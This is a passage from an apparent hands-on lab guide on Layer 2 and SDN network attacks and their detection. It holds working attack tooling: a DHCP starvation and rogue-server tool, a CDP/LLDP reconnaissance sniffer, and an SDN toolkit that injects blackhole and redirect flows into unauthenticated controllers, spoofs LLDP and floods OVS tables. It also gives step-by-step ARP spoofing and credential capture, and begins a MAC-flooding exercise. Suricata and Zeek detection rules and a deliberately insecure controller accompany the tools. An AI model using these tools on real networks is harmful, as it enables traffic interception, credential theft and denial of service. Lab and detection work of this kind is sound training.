    rogue.add_argument('--pool-start', required=True)
    rogue.add_argument('--pool-end', required=True)
    rogue.add_argument('--gateway', required=True,
                       help='Attacker IP (becomes default gateway)')
    rogue.add_argument('--dns', required=True,
                       help='Attacker DNS server IP')

    args = parser.parse_args()

    if args.mode == 'starve':
        atk = DHCPStarvation(args.interface, args.count)
        atk.starve()
    elif args.mode == 'rogue':
        srv = RogueDHCPServer(
            args.interface, args.pool_start, args.pool_end,
            args.gateway, args.dns
        )
        srv.start()
    else:
        parser.print_help()
DHCPATTACK
chmod +x /opt/attacks/l2/dhcp_attack.py


# ──────────────────────────────────────────────────────────────
# CDP/LLDP RECONNAISSANCE
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/cdp_lldp_recon.py << 'CDPRECON'
#!/usr/bin/env python3
"""
CDP and LLDP passive reconnaissance.
Captures discovery protocol frames to map network infrastructure:
hostnames, IPs, platforms, IOS versions, VLANs, port IDs.
"""
import argparse
from scapy.all import sniff, Ether, Raw

def cdp_listener(interface, duration=120):
    """Listen for CDP frames (Cisco proprietary)."""
    devices = {}

    def process_cdp(pkt):
        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw])
            src_mac = pkt[Ether].src
            # CDP frames: ethertype is length, LLC SNAP OUI=00000c PID=2000
            # Simple extraction of TLV fields
            print(f"\n[CDP] Frame from {src_mac}")
            print(f"      Raw length: {len(raw)} bytes")
            # Parse CDP TLVs (type:2 bytes, length:2 bytes, value)
            offset = 4  # skip version (1) + ttl (1) + checksum (2)
            while offset < len(raw) - 4:
                try:
                    tlv_type = int.from_bytes(raw[offset:offset+2], 'big')
                    tlv_len = int.from_bytes(raw[offset+2:offset+4], 'big')
                    if tlv_len < 4 or offset + tlv_len > len(raw):
                        break
                    tlv_val = raw[offset+4:offset+tlv_len]
                    tlv_names = {
                        1: 'Device-ID', 2: 'Addresses', 3: 'Port-ID',
                        4: 'Capabilities', 5: 'Version', 6: 'Platform',
                        10: 'Native-VLAN', 11: 'Duplex'
                    }
                    name = tlv_names.get(tlv_type, f'Type-{tlv_type}')
                    if tlv_type in (1, 3, 5, 6):
                        val_str = tlv_val.decode(errors='replace')
                        print(f"      {name}: {val_str}")
                    elif tlv_type == 10 and len(tlv_val) >= 2:
                        vlan = int.from_bytes(tlv_val[:2], 'big')
                        print(f"      {name}: {vlan}")
                    elif tlv_type == 2 and len(tlv_val) >= 9:
                        # Address TLV: number(4) + protocol_type(1) +
                        # protocol_len(1) + protocol(N) + addr_len(2) + addr(N)
                        try:
                            ip_bytes = tlv_val[9:13]
                            ip_str = '.'.join(str(b) for b in ip_bytes)
                            print(f"      {name}: {ip_str}")
                        except Exception:
                            pass
                    offset += tlv_len
                except Exception:
                    break

    print(f"[*] CDP listener on {interface} for {duration}s")
    print(f"    CDP interval is typically 60s — wait at least 60s")
    sniff(
        iface=interface,
        filter="ether[20:2] == 0x2000",
        prn=process_cdp,
        timeout=duration,
        store=False
    )


def lldp_listener(interface, duration=120):
    """Listen for LLDP frames (IEEE 802.1AB)."""
    devices = {}

    def process_lldp(pkt):
        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw])
            src_mac = pkt[Ether].src
            print(f"\n[LLDP] Frame from {src_mac}")

            # LLDP TLVs: type(7 bits) + length(9 bits) = 2 bytes header
            offset = 0
            while offset < len(raw) - 2:
                try:
                    hdr = int.from_bytes(raw[offset:offset+2], 'big')
                    tlv_type = (hdr >> 9) & 0x7F
                    tlv_len = hdr & 0x1FF
                    if tlv_type == 0:  # End of LLDPDU
                        break
                    tlv_val = raw[offset+2:offset+2+tlv_len]

                    tlv_names = {
                        1: 'Chassis-ID', 2: 'Port-ID', 3: 'TTL',
                        4: 'Port-Desc', 5: 'System-Name',
                        6: 'System-Desc', 7: 'Capabilities',
                        8: 'Mgmt-Address'
                    }
                    name = tlv_names.get(tlv_type, f'Type-{tlv_type}')

                    if tlv_type in (1, 2):
                        subtype = tlv_val[0] if tlv_val else 0
                        val = tlv_val[1:].decode(errors='replace')
                        print(f"      {name} (subtype {subtype}): {val}")
                    elif tlv_type in (4, 5, 6):
                        print(f"      {name}: {tlv_val.decode(errors='replace')}")
                    elif tlv_type == 3 and len(tlv_val) >= 2:
                        ttl = int.from_bytes(tlv_val[:2], 'big')
                        print(f"      {name}: {ttl}s")
                    elif tlv_type == 8 and len(tlv_val) >= 7:
                        # Management address
                        addr_len = tlv_val[0]
                        addr_subtype = tlv_val[1]
                        if addr_subtype == 1 and addr_len >= 5:
                            ip = '.'.join(str(b) for b in tlv_val[2:6])
                            print(f"      {name}: {ip}")

                    offset += 2 + tlv_len
                except Exception:
                    break

    print(f"[*] LLDP listener on {interface} for {duration}s")
    print(f"    LLDP interval is typically 30s")
    sniff(
        iface=interface,
        filter="ether proto 0x88cc",
        prn=process_lldp,
        timeout=duration,
        store=False
    )


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CDP/LLDP Reconnaissance')
    parser.add_argument('-i', '--interface', required=True)
    parser.add_argument('-p', '--protocol', choices=['cdp', 'lldp', 'both'],
                        default='both')
    parser.add_argument('-t', '--time', type=int, default=120)
    args = parser.parse_args()

    if args.protocol in ('cdp', 'both'):
        cdp_listener(args.interface, args.time)
    if args.protocol in ('lldp', 'both'):
        lldp_listener(args.interface, args.time)
CDPRECON
chmod +x /opt/attacks/l2/cdp_lldp_recon.py


# ──────────────────────────────────────────────────────────────
# SDN ATTACK TOOLKIT
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/sdn/sdn_attack.py << 'SDNATTACK'
#!/usr/bin/env python3
"""
SDN Attack Toolkit:
1. OpenFlow controller API exploitation (unauthenticated)
2. LLDP topology spoofing (link fabrication)
3. Flow table poisoning via API
4. OVS flow table exhaustion
"""
import json
import time
import argparse
import subprocess
from urllib.request import urlopen, Request
from urllib.error import URLError
from scapy.all import (
    Ether, Raw, sendp, get_if_hwaddr,
    IP, TCP, RandIP, RandShort
)


class SDNControllerExploit:
    """Exploit unauthenticated SDN controller REST APIs."""

    def __init__(self, controller_url):
        self.base_url = controller_url.rstrip('/')

    def _api_get(self, path):
        try:
            req = Request(f"{self.base_url}{path}")
            resp = urlopen(req, timeout=5)
            return json.loads(resp.read())
        except URLError as e:
            print(f"[-] API error: {e}")
            return None

    def _api_post(self, path, data):
        try:
            payload = json.dumps(data).encode()
            req = Request(
                f"{self.base_url}{path}",
                data=payload,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            resp = urlopen(req, timeout=5)
            return resp.status
        except URLError as e:
            print(f"[-] API error: {e}")
            return None

    def enumerate_ryu(self):
        """Enumerate Ryu controller (default port 8080, no auth)."""
        print("[*] Enumerating Ryu controller...")

        # List switches
        switches = self._api_get('/stats/switches')
        if switches:
            print(f"[+] Connected switches: {switches}")
            for dpid in switches:
                # Get flow tables
                flows = self._api_get(f'/stats/flow/{dpid}')
                if flows:
                    flow_list = flows.get(str(dpid), [])
                    print(f"    Switch {dpid}: {len(flow_list)} flow rules")
                    for f in flow_list[:5]:
                        match = f.get('match', {})
                        actions = f.get('actions', [])
                        priority = f.get('priority', 0)
                        print(f"      P={priority} M={match} A={actions}")

                # Get port stats
                ports = self._api_get(f'/stats/port/{dpid}')
                if ports:
                    port_list = ports.get(str(dpid), [])
                    print(f"    Ports: {len(port_list)}")
                    for p in port_list:
                        pn = p.get('port_no', '?')
                        rx = p.get('rx_packets', 0)
                        tx = p.get('tx_packets', 0)
                        print(f"      Port {pn}: RX={rx} TX={tx}")

        # Get topology
        links = self._api_get('/v1.0/topology/links')
        if links:
            print(f"\n[+] Topology links: {len(links)}")
            for link in links:
                src = link.get('src', {})
                dst_l = link.get('dst', {})
                print(f"    {src.get('dpid')}:{src.get('port_no')} → "
                      f"{dst_l.get('dpid')}:{dst_l.get('port_no')}")

    def inject_flow_ryu(self, dpid, match_dict, actions_list, priority=500):
        """Inject a flow rule into a Ryu-managed switch."""
        flow = {
            "dpid": dpid,
            "table_id": 0,
            "priority": priority,
            "match": match_dict,
            "actions": actions_list
        }
        print(f"[*] Injecting flow rule into switch {dpid}:")
        print(f"    Match: {match_dict}")
        print(f"    Actions: {actions_list}")
        print(f"    Priority: {priority}")

        status = self._api_post('/stats/flowentry/add', flow)
        if status and status == 200:
            print("[+] Flow rule injected successfully!")
        else:
            print(f"[-] Injection failed (status: {status})")

    def blackhole_host(self, dpid, target_ip):
        """Inject a DROP rule for all traffic to a specific host."""
        self.inject_flow_ryu(
            dpid=dpid,
            match_dict={"dl_type": 2048, "nw_dst": target_ip},
            actions_list=[],  # empty = drop
            priority=999
        )
        print(f"[!] BLACKHOLE: All traffic to {target_ip} will be dropped")

    def redirect_traffic(self, dpid, target_ip, redirect_port):
        """Redirect all traffic destined to target_ip to a specific port."""
        self.inject_flow_ryu(
            dpid=dpid,
            match_dict={"dl_type": 2048, "nw_dst": target_ip},
            actions_list=[{"type": "OUTPUT", "port": redirect_port}],
            priority=999
        )
        print(f"[!] REDIRECT: Traffic to {target_ip} → port {redirect_port}")

    def enumerate_odl(self, username="admin", password="admin"):
        """Enumerate OpenDaylight (default creds admin/admin)."""
        import base64
        auth_str = base64.b64encode(
            f"{username}:{password}".encode()
        ).decode()

        print(f"[*] Enumerating OpenDaylight with {username}:{password}")

        try:
            req = Request(
                f"{self.base_url}/restconf/operational/"
                "opendaylight-inventory:nodes",
                headers={'Authorization': f'Basic {auth_str}'}
            )
            resp = urlopen(req, timeout=5)
            data = json.loads(resp.read())
            nodes = data.get('nodes', {}).get('node', [])
            print(f"[+] ODL nodes: {len(nodes)}")
            for node in nodes:
                node_id = node.get('id', '?')
                connectors = node.get('node-connector', [])
                print(f"    Node: {node_id}, Ports: {len(connectors)}")
        except URLError as e:
            if '401' in str(e):
                print(f"[-] Authentication failed — creds not default")
            else:
                print(f"[-] ODL API error: {e}")


class LLDPSpoofing:
    """Forge LLDP frames to manipulate SDN topology discovery."""

    def __init__(self, interface):
        self.iface = interface

    def fabricate_link(self, fake_chassis_id, fake_port_id, count=30,
                       interval=2):
        """
        Inject forged LLDP to make the SDN controller believe a
        link exists between this switch port and a fake switch.
        """
        print(f"[*] LLDP Link Fabrication on {self.iface}")
        print(f"    Fake chassis: {fake_chassis_id}")
        print(f"    Fake port: {fake_port_id}")

        # Build LLDP TLVs manually
        def build_tlv(tlv_type, value):
            length = len(value)
            header = ((tlv_type & 0x7F) << 9) | (length & 0x1FF)
            return header.to_bytes(2, 'big') + value

        chassis_tlv = build_tlv(1, b'\x07' + fake_chassis_id.encode())
        port_tlv = build_tlv(2, b'\x07' + fake_port_id.encode())
        ttl_tlv = build_tlv(3, (120).to_bytes(2, 'big'))
        end_tlv = build_tlv(0, b'')

        lldp_payload = chassis_tlv + port_tlv + ttl_tlv + end_tlv

        for i in range(count):
            pkt = Ether(
                dst="01:80:c2:00:00:0e",
                src=get_if_hwaddr(self.iface),
                type=0x88cc
            ) / Raw(load=lldp_payload)

            sendp(pkt, iface=self.iface, verbose=False)
            if (i + 1) % 10 == 0:
                print(f"    Sent {i+1}/{count} forged LLDP frames")
            time.sleep(interval)

        print("[+] LLDP spoofing complete")
        print("    Controller should now show a fake link in topology")


class OVSExhaustion:
    """Exhaust OVS flow table cache via diverse 5-tuple flooding."""

    def __init__(self, interface, target_ip):
        self.iface = interface
        self.target_ip = target_ip

    def flood_flows(self, count=100000, burst=1000):
        """Generate packets with unique 5-tuples to exhaust OVS cache."""
        print(f"[*] OVS Flow Table Exhaustion")
        print(f"    Target: {self.target_ip}")
        print(f"    Unique flows: {count}")

        batch = []
        sent = 0
        for i in range(count):
            pkt = Ether() / \
                  IP(src=str(RandIP()), dst=self.target_ip) / \
                  TCP(sport=int(RandShort()), dport=int(RandShort()))
            batch.append(pkt)

            if len(batch) >= burst:
                sendp(batch, iface=self.iface, verbose=False)
                sent += len(batch)
                batch = []
                if sent % 10000 == 0:
                    print(f"    Sent {sent}/{count} unique flows")

        if batch:
            sendp(batch, iface=self.iface, verbose=False)
            sent += len(batch)

        print(f"[+] Exhaustion attack complete: {sent} unique flows sent")
        print("    Check OVS: ovs-dpctl show | grep flows")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SDN Attack Toolkit')
    sub = parser.add_subparsers(dest='mode')

    enum_ryu = sub.add_parser('enum-ryu', help='Enumerate Ryu controller')
    enum_ryu.add_argument('-u', '--url', default='http://10.9.2.50:8080')

    inject = sub.add_parser('inject', help='Inject flow rule via Ryu API')
    inject.add_argument('-u', '--url', default='http://10.9.2.50:8080')
    inject.add_argument('--dpid', type=int, required=True)
    inject.add_argument('--target-ip', required=True)
    inject.add_argument('--action', choices=['drop', 'redirect'], required=True)
    inject.add_argument('--port', type=int, help='Redirect port (for redirect)')

    lldp = sub.add_parser('lldp-spoof', help='LLDP topology spoofing')
    lldp.add_argument('-i', '--interface', required=True)
    lldp.add_argument('--chassis', default='fake-switch-01')
    lldp.add_argument('--port-name', default='eth0')

    exhaust = sub.add_parser('ovs-exhaust', help='OVS flow table exhaustion')
    exhaust.add_argument('-i', '--interface', required=True)
    exhaust.add_argument('--target', required=True)
    exhaust.add_argument('-c', '--count', type=int, default=100000)

    args = parser.parse_args()

    if args.mode == 'enum-ryu':
        ctrl = SDNControllerExploit(args.url)
        ctrl.enumerate_ryu()
    elif args.mode == 'inject':
        ctrl = SDNControllerExploit(args.url)
        if args.action == 'drop':
            ctrl.blackhole_host(args.dpid, args.target_ip)
        elif args.action == 'redirect' and args.port:
            ctrl.redirect_traffic(args.dpid, args.target_ip, args.port)
    elif args.mode == 'lldp-spoof':
        spoof = LLDPSpoofing(args.interface)
        spoof.fabricate_link(args.chassis, args.port_name)
    elif args.mode == 'ovs-exhaust':
        exh = OVSExhaustion(args.interface, args.target)
        exh.flood_flows(args.count)
    else:
        parser.print_help()
SDNATTACK
chmod +x /opt/attacks/sdn/sdn_attack.py


# ── Pre-captured pcap directory ──
mkdir -p /opt/captures

echo "[+] VM2 attacker setup complete"
```

---

### VM3 — Detection Setup

```bash
#!/bin/bash
# vm3_detection_setup.sh — IDS/IPS rules and monitoring

set -euo pipefail

apt-get update && apt-get install -y \
    suricata arpwatch tcpdump tshark \
    docker.io docker-compose-v2

# ── Suricata L2/Wireless/SDN rules ──
mkdir -p /etc/suricata/rules

cat > /etc/suricata/rules/l2_wireless_sdn.rules << 'SURIRULES'
# ═══════════════════════════════════════════════════
#  LAYER 2 DETECTION RULES
# ═══════════════════════════════════════════════════

# ARP spoofing — gratuitous ARP flood (rate-based)
alert arp any any -> any any (msg:"ARP Spoofing - Gratuitous ARP Flood"; \
  arp_opcode:2; threshold:type threshold, track by_src, count 10, seconds 5; \
  sid:2000001; rev:1;)

# MAC flooding — excessive source MAC diversity
alert ip any any -> any any (msg:"MAC Flooding - Excessive Source MAC Diversity"; \
  threshold:type threshold, track by_src, count 1000, seconds 10; \
  sid:2000002; rev:1;)

# DHCP starvation — rapid DHCP Discover from diverse MACs
alert udp any 68 -> any 67 (msg:"DHCP Starvation - Rapid Discover"; \
  content:"|01|"; offset:0; depth:1; \
  threshold:type threshold, track by_src, count 20, seconds 5; \
  sid:2000003; rev:1;)

# Rogue DHCP server — DHCP Offer from unexpected source
# (adjust IP to your legitimate DHCP server)
alert udp !10.9.2.1 67 -> any 68 (msg:"Rogue DHCP Server Detected"; \
  content:"|02|"; offset:0; depth:1; \
  sid:2000004; rev:1;)

# STP BPDU with priority 0 — root bridge hijack attempt
alert tcp any any -> any any (msg:"STP Root Bridge Hijack - Priority 0 BPDU"; \
  flow:not_established; \
  content:"|42 42 03|"; offset:14; depth:3; \
  content:"|00 00|"; offset:21; depth:2; \
  sid:2000005; rev:1;)

# DTP negotiation — trunk negotiation from access port
alert tcp any any -> any any (msg:"DTP Trunk Negotiation Detected"; \
  content:"|aa aa 03 00 00 0c 20 04|"; \
  sid:2000006; rev:1;)

# CDP flooding
alert tcp any any -> any any (msg:"CDP Flooding - Excessive CDP Frames"; \
  content:"|aa aa 03 00 00 0c 20 00|"; \
  threshold:type threshold, track by_src, count 10, seconds 30; \
  sid:2000007; rev:1;)

# Double-tagged VLAN frame (two 802.1Q headers)
alert ip any any -> any any (msg:"Double 802.1Q Tag Detected - VLAN Hopping"; \
  content:"|81 00|"; offset:12; depth:2; \
  content:"|81 00|"; offset:16; depth:2; \
  sid:2000008; rev:1;)


# ═══════════════════════════════════════════════════
#  WIRELESS-RELATED DETECTION (wired-side indicators)
# ═══════════════════════════════════════════════════

# Multiple RADIUS auth failures (brute force indicator)
alert udp any any -> any 1812 (msg:"RADIUS Auth Flood - Possible WPA2-Ent Attack"; \
  threshold:type threshold, track by_src, count 20, seconds 60; \
  sid:2000010; rev:1;)

# EAP-Start flood (802.1X abuse)
alert tcp any any -> any any (msg:"EAP-Start Flood - 802.1X Attack"; \
  content:"|01 01|"; offset:14; depth:2; \
  threshold:type threshold, track by_src, count 10, seconds 10; \
  sid:2000011; rev:1;)


# ═══════════════════════════════════════════════════
#  SDN-SPECIFIC DETECTION
# ═══════════════════════════════════════════════════

# OpenFlow controller API access (unauthenticated)
alert http any any -> any 8080 (msg:"SDN Controller API Access - Ryu Detected"; \
  content:"/stats/"; http_uri; \
  sid:2000020; rev:1;)

alert http any any -> any 8181 (msg:"SDN Controller API Access - ODL/ONOS"; \
  content:"/restconf/"; http_uri; \
  sid:2000021; rev:1;)

# SDN flow injection via REST API
alert http any any -> any 8080 (msg:"SDN Flow Injection Attempt - Ryu"; \
  content:"POST"; http_method; \
  content:"/stats/flowentry/add"; http_uri; \
  sid:2000022; rev:1;)

# LLDP from non-switch port (topology spoofing)
alert tcp any any -> any any (msg:"LLDP Spoofing - Unexpected Source"; \
  content:"|01 80 c2 00 00 0e|"; offset:0; depth:6; \
  sid:2000023; rev:1;)

# OVS flow table exhaustion (excessive unique flows)
alert ip any any -> any any (msg:"Potential OVS Flow Exhaustion Attack"; \
  threshold:type threshold, track by_dst, count 5000, seconds 10; \
  sid:2000024; rev:1;)

# Conntrack table exhaustion indicator
alert ip any any -> any any (msg:"Conntrack Exhaustion - High New Connection Rate"; \
  threshold:type threshold, track by_dst, count 10000, seconds 10; \
  sid:2000025; rev:1;)

# Fragmented packet evasion (very small fragments)
alert ip any any -> any any (msg:"Suspicious IP Fragmentation - Small Fragments"; \
  fragbits:M; dsize:<100; \
  sid:2000026; rev:1;)

# VXLAN traffic on unexpected port
alert udp any any -> any 4789 (msg:"VXLAN Traffic Detected - Verify Authorization"; \
  sid:2000027; rev:1;)
SURIRULES

# ── Suricata config update ──
if ! grep -q "l2_wireless_sdn.rules" /etc/suricata/suricata.yaml; then
    sed -i '/rule-files:/a\  - l2_wireless_sdn.rules' /etc/suricata/suricata.yaml
fi

# ── arpwatch setup ──
arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat
echo "[+] arpwatch started — monitoring ARP changes"

# ── Zeek L2 scripts ──
mkdir -p /opt/zeek/scripts

cat > /opt/zeek/scripts/l2_anomaly_detect.zeek << 'ZEEKL2'
##! L2 Anomaly Detection for Layer 2 / Wireless / SDN lab

module L2Anomaly;

export {
    redef enum Notice::Type += {
        ARP_Spoofing,
        DHCP_Starvation,
        MAC_Flood_Indicator,
        STP_Root_Hijack,
        SDN_API_Access,
    };
}

# Track IP-to-MAC bindings
global ip_mac_table: table[addr] of string = {};
global arp_count_by_src: table[string] of count = {} &default=0
    &read_expire=30sec;
global dhcp_discover_count: count = 0 &read_expire=10sec;

event arp_reply(mac_src: string, mac_dst: string,
                SPA: addr, SHA: string, TPA: addr, THA: string)
{
    # Track MAC-IP bindings
    if (SPA in ip_mac_table) {
        if (ip_mac_table[SPA] != SHA) {
            NOTICE([
                $note=ARP_Spoofing,
                $msg=fmt("ARP spoof: %s changed MAC %s → %s",
                         SPA, ip_mac_table[SPA], SHA),
                $src=SPA,
                $identifier=cat(SPA)
            ]);
        }
    }
    ip_mac_table[SPA] = SHA;

    # Rate-based ARP flood detection
    arp_count_by_src[SHA] += 1;
    if (arp_count_by_src[SHA] > 50) {
        NOTICE([
            $note=ARP_Spoofing,
            $msg=fmt("ARP flood from MAC %s: %d replies in window",
                     SHA, arp_count_by_src[SHA]),
            $identifier=SHA
        ]);
    }
}

event dhcp_message(c: connection, is_orig: bool, msg: DHCP::Msg,
                   options: DHCP::Options)
{
    if (options?$message_type && options$message_type == 1) {
        dhcp_discover_count += 1;
        if (dhcp_discover_count > 30) {
            NOTICE([
                $note=DHCP_Starvation,
                $msg=fmt("DHCP starvation: %d Discovers in window",
                         dhcp_discover_count),
                $conn=c,
                $identifier="dhcp_starve"
            ]);
        }
    }
}

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    if (c$id$resp_p == 8080/tcp || c$id$resp_p == 8181/tcp) {
        if (/stats|restconf|onos/ in original_URI) {
            NOTICE([
                $note=SDN_API_Access,
                $msg=fmt("SDN controller API access: %s %s from %s",
                         method, original_URI, c$id$orig_h),
                $conn=c,
                $identifier=cat(c$id$orig_h, original_URI)
            ]);
        }
    }
}
ZEEKL2

# ── ELK Stack for log aggregation ──
mkdir -p /opt/elk

cat > /opt/elk/docker-compose.yml << 'DOCKER'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.12.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"
    ports:
      - "9200:9200"
    volumes:
      - es_data:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.12.0
    depends_on:
      - elasticsearch
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"

  logstash:
    image: docker.elastic.co/logstash/logstash:8.12.0
    depends_on:
      - elasticsearch
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf:ro
      - /var/log/suricata:/var/log/suricata:ro
    ports:
      - "5044:5044"

volumes:
  es_data:
DOCKER

cat > /opt/elk/logstash.conf << 'LOGSTASH'
input {
  file {
    path => "/var/log/suricata/eve.json"
    codec => json
    type => "suricata"
    start_position => "beginning"
    sincedb_path => "/dev/null"
  }
}

filter {
  if [type] == "suricata" {
    date {
      match => ["timestamp", "ISO8601"]
    }
    if [event_type] == "alert" {
      mutate {
        add_tag => ["alert"]
      }
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "suricata-%{+YYYY.MM.dd}"
  }
}
LOGSTASH

echo "[+] VM3 detection setup complete"
echo "    Start ELK: cd /opt/elk && docker compose up -d"
echo "    Start Suricata: suricata -c /etc/suricata/suricata.yaml -i eth0"
```

---

### VM5 — SDN Controller Setup

```bash
#!/bin/bash
# vm5_sdn_controller_setup.sh — Ryu + OVS controller environment

set -euo pipefail

apt-get update && apt-get install -y \
    python3-pip openvswitch-switch openvswitch-common \
    curl jq

pip3 install ryu eventlet

# ── OVS bridge with OpenFlow ──
ovs-vsctl add-br br0 -- set bridge br0 protocols=OpenFlow13
ovs-vsctl set-controller br0 tcp:127.0.0.1:6633

# Add ports (adjust to match VM NICs)
# ovs-vsctl add-port br0 eth1
# ovs-vsctl add-port br0 eth2

# ── Ryu controller application (simple L2 switch) ──
mkdir -p /opt/sdn

cat > /opt/sdn/simple_switch.py << 'RYUAPP'
"""
Ryu Simple Switch (L2 learning) — intentionally insecure for lab.
- No TLS on OpenFlow channel
- No authentication on REST API
- No flow rule validation
"""
from ryu.base import app_manager
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.ofproto import ofproto_v1_3
from ryu.lib.packet import packet, ethernet, arp, ipv4
from ryu.app.wsgi import ControllerBase, WSGIApplication, route
from ryu.lib import hub
import json

class SimpleSwitch(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.mac_to_port = {}

    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)
    def switch_features_handler(self, ev):
        datapath = ev.msg.datapath
        ofproto = datapath.ofproto
        parser = datapath.ofproto_parser
        # Default: send to controller
        match = parser.OFPMatch()
        actions = [parser.OFPActionOutput(
            ofproto.OFPP_CONTROLLER, ofproto.OFPCML_NO_BUFFER
        )]
        self._add_flow(datapath, 0, match, actions)

    def _add_flow(self, datapath, priority, match, actions):
        ofproto = datapath.ofproto
        parser = datapath.ofproto_parser
        inst = [parser.OFPInstructionActions(
            ofproto.OFPIT_APPLY_ACTIONS, actions
        )]
        mod = parser.OFPFlowMod(
            datapath=datapath, priority=priority,
            match=match, instructions=inst
        )
        datapath.send_msg(mod)

    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
    def packet_in_handler(self, ev):
        msg = ev.msg
        datapath = msg.datapath
        ofproto = datapath.ofproto
        parser = datapath.ofproto_parser
        in_port = msg.match['in_port']

        pkt = packet.Packet(msg.data)
        eth = pkt.get_protocols(ethernet.ethernet)[0]
        dst = eth.dst
        src = eth.src
        dpid = datapath.id

        self.mac_to_port.setdefault(dpid, {})
        self.mac_to_port[dpid][src] = in_port

        if dst in self.mac_to_port[dpid]:
            out_port = self.mac_to_port[dpid][dst]
        else:
            out_port = ofproto.OFPP_FLOOD

        actions = [parser.OFPActionOutput(out_port)]

        if out_port != ofproto.OFPP_FLOOD:
            match = parser.OFPMatch(in_port=in_port, eth_dst=dst, eth_src=src)
            self._add_flow(datapath, 1, match, actions)

        data = None
        if msg.buffer_id == ofproto.OFP_NO_BUFFER:
            data = msg.data

        out = parser.OFPPacketOut(
            datapath=datapath, buffer_id=msg.buffer_id,
            in_port=in_port, actions=actions, data=data
        )
        datapath.send_msg(out)
RYUAPP

cat > /opt/sdn/start_controller.sh << 'START'
#!/bin/bash
echo "[*] Starting Ryu SDN controller..."
echo "    OpenFlow: tcp:0.0.0.0:6633 (NO TLS)"
echo "    REST API: http://0.0.0.0:8080 (NO AUTH)"
echo "    This is intentionally insecure for lab exercises."
ryu-manager --ofp-tcp-listen-port 6633 \
            --wsapi-port 8080 \
            /opt/sdn/simple_switch.py \
            ryu.app.ofctl_rest \
            ryu.app.rest_topology
START
chmod +x /opt/sdn/start_controller.sh

echo "[+] VM5 SDN controller setup complete"
echo "    Start: /opt/sdn/start_controller.sh"
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: ARP Spoofing and Credential Capture

**Objective:** Perform full-duplex ARP cache poisoning between the victim (VM1) and the gateway, then capture cleartext credentials over HTTP and FTP.

**Pre-check (VM1 — Victim):**

```bash
# Record legitimate ARP state
arp -a
ip neigh show
# Note the gateway MAC — this should change during attack
```

**Step 1 — Enable IP forwarding on attacker (VM2):**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Step 2 — Launch ARP spoof (VM2):**

```bash
# Method A: Custom Python script with credential capture
python3 /opt/attacks/l2/arp_spoof.py attack \
    -i eth0 -v 10.9.2.10 -g 10.9.2.1

# Method B: Bettercap (interactive)
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 10.9.2.10
> set arp.spoof.fullduplex true
> arp.spoof on
> net.sniff on

# Method C: Classic arpspoof (two terminals)
# Terminal 1: tell victim we are gateway
arpspoof -i eth0 -t 10.9.2.10 10.9.2.1
# Terminal 2: tell gateway we are victim
arpspoof -i eth0 -t 10.9.2.1 10.9.2.10
```

**Step 3 — Verify poisoning (VM1):**

```bash
arp -a
# Expected: gateway IP 10.9.2.1 should now show ATTACKER's MAC
# (was the real gateway MAC before attack)
```

**Step 4 — Generate credential traffic (VM1):**

```bash
# HTTP login
curl -X POST http://lab.local/api/login \
    -d "username=admin&password=Secret123"

# FTP login
ftp 10.9.2.10 <<EOF
anonymous
anonymous@test.com
ls
quit
EOF
```

**Expected output on VM2 (credential sniffer):**

```
[CRED] 10.9.2.10 → 10.9.2.10:8888
       username=admin&password=Secret123

[CRED] 10.9.2.10 → 10.9.2.10:21
       USER anonymous
       PASS anonymous@test.com
```

**Step 5 — Cleanup and restore:**

```bash
# The Python script restores ARP on Ctrl+C
# Manually if needed:
python3 -c "
from scapy.all import *
# Send correct ARP entries
sendp(Ether(dst='VICTIM_MAC')/ARP(op=2, psrc='10.9.2.1',
      hwsrc='REAL_GW_MAC', pdst='10.9.2.10'), iface='eth0', count=5)
sendp(Ether(dst='REAL_GW_MAC')/ARP(op=2, psrc='10.9.2.10',
      hwsrc='VICTIM_MAC', pdst='10.9.2.1'), iface='eth0', count=5)
"
```

**Verification (VM1):**

```bash
# ARP table should show original gateway MAC after restore
arp -a
# Confirm connectivity
ping -c 3 10.9.2.1
```

**Defense analysis:**

```bash
# On VM3, verify arpwatch detected the change
grep -i "flip flop\|changed ethernet" /var/log/syslog | tail -20

# DAI would have dropped the spoofed ARPs at the switch level
# Static ARP entries prevent cache overwrite:
arp -s 10.9.2.1 <REAL_GATEWAY_MAC>
```

---

### Exercise 2: MAC Flooding and CAM Table Overflow

**Objective:** Overflow the switch CAM table to force hub-mode behavior, then verify that unicast traffic from other hosts becomes visible on the attacker's port.

**Step 1 — Baseline: verify normal switching (VM2):**

```bash
# Sniff for unicast traffic NOT addressed to us
tcpdump -i eth0 -c 20 'not ether dst '$(cat /sys/class/net/eth0/address)' and not ether broadcast'
# Expected: minimal or zero foreign unicast frames
```

**Step 2 — Flood CAM table (VM2):**

```bash
# Method A: Custom script with verification
python3 /opt/attacks/l2/mac_flood.py -i eth0 -c 100000 --verify

# Method B: macof (classic, high speed)
macof -i eth0
# Generates ~150K random MAC frames/sec

# Method C: yersinia
yersinia eth0 -attack 1
```

**Step 3 — Verify hub mode (VM2):**

```bash
